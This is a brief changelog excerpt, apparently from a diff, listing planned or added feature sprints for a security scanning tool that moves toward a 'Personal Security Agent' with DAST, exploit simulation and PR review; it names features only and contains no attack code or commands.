 *Sprints 52–65: new capability layer added March 2026 — fuzzing, privacy/PII, crypto health, binary security, threat modeling, gamification, dependency auto-fix, LLM security, network config analysis, test generation, multi-tenant API, forensic mode, risk scoring/SLA, and OpenSSF ecosystem integration.*
+*Sprints 66–71: strategic pivot to Personal Security Agent — rebranding, AI intelligence layer, sandboxed DAST, exploit simulation, attack path analysis, and autonomous PR review — added March 2026.*
